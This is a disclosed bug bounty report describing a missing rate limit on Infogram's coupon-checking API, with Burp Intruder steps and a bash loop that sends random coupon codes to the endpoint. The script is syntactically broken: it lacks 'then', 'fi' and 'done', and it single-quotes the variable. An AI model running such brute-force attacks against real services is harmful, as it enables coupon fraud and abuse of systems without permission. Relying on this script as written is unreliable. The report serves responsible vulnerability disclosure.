# Bruteforcing Coupons

## Report Details
- **Report ID**: 288846
- **URL**: https://hackerone.com/reports/288846
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-11-09T15:57:10.803Z
- **Disclosed**: 2017-12-12T19:48:01.100Z

## Reporter
- **Username**: t-pwn
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: infogram

## Vulnerability Information
Hi,

while i was fuzzing for an API endpoints i found this endpoint: https://infogram.com/api/discounts
the first thing came on my mind is bruteforcing the coupon codes so i gave it a try and it worked!
there's no rate limit on that endpoint so an attacker could use it to bruteforce the coupon codes and filter the results to snipe the "valid":true response

##Steps to reproduce:

+ intercept the request using burpsuite or any proxy tool you would like to use

+ send the request to the intruder

+ configure the payload position

     {F238091}

+ start the attack

i wrote a simple script in bash to do the operation

```

#!/bin/bash

while [ 1 ]
do

  coupon=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 6 | head -n 1)
  curl=$(curl -i -s -k  -X $'GET' \
    -H $'X-Requested-With: XMLHttpRequest' \
    -b $'Cookies:XXXXXXX' \
    $'https://infogram.com/api/discounts/$coupon')

  if [[ $curl == *"valid":true* ]]
    echo "$coupon is valid";
  else
    echo "$coupon is invalid";
  
break;

```

Thanks.

## Attachments
- Screenshot_from_2017-11-09_10-28-27.png
